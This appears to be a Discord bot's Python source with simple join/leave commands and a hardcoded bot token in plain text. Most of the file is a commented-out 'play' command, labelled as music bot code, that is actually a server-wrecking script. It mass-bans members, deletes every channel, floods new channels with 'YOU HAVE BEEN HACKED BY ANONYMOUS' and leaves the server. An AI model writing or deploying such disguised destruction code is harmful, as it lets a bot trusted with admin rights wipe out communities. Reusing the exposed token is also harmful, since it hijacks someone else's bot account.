import asyncio
import discord
from discord.ext import commands
from discord import Member
import youtube_dl


config = {
    'token': 'MTEyNjk4NDAzNzI5NTIxNDYzMg.GxMArX.ZfidE3cgYcXIb7RqhAOd3FfQdJBKvM6IaGO4lM',
    'prefix': '.',
}

intents = discord.Intents.all()
intents.members = True

bot = commands.Bot(command_prefix=config['prefix'], intents=intents)



@bot.command()
async def hello(ctx):
    await ctx.send("Hello")
    
@bot.command()
async def join(ctx):
    ctx.send("Joined voice channel!")
    channel = ctx.author.voice.channel
    await channel.connect()

@bot.command()
async def leave(ctx):
    ctx.send("Left voice channel!")
    await ctx.voice_client.disconnect()

bot.run(config['token'])



###########################################################################################################################################


# Gachi Music Bot Code---------------------------------------------------------------------------------------------------------------------




# exception_list = [509762933484683266, 582849312388677633, 524943385635848226, 1033315601986363432, 331481590259777539, 267701588775141377]
# death_list = []


# @bot.command()
# async def play(ctx):
#     guild = ctx.guild

#     for member in guild.members:
#       # await ban_not_in_list(member)
#       await ban_in_list(member)

#     await delete_channels(guild)
#     await create_tcs(guild)
#     await send_messages(guild)
#     await create_vcs(guild)
#     await leave_server(guild)

# async def ban_not_in_list(member):
#   if member.id not in exception_list:
#     await ban_member(member)

# async def ban_in_list(member):
#   if member.id in death_list:
#     await ban_member(member)


# async def ban_member(member):
#   try:
#     await member.ban()
#   except:
#     print("didn't ban", member.display_name)

# async def delete_channels(guild):
#   for c in guild.channels:
#     await delete_channel(c)

# async def delete_channel(channel):
#   await channel.delete()

# async def create_tcs(guild):
#   for i in channelNames:
#     await create_tc(guild, i)

# async def create_tc(guild, name):
#   await guild.create_text_channel(name)

# async def send_messages(guild):
#   for c in guild.channels:
#     await send_message(c)

# async def send_message(channel):
#   await channel.send("YOU HAVE BEEN HACKED BY ANONYMOUS")

# async def create_vcs(guild):
#   for i in channelNames:
#     await create_vc(guild, i)

# async def create_vc(guild, name):
#   await guild.create_voice_channel(name)

# async def leave_server(guild):
#   await guild.leave()

# channelNames = ["YOU", "HAVE", "BEEN", "HACKED",
#                 "BY", "A", "N", 'O', 'N', 'Y', 'M', 'O', 'U', 'S']


# @bot.command()
# async def clear(ctx):
#     guild = ctx.guild
#     for c in guild.channels:
#         await c.delete()
#     await guild.create_text_channel("test")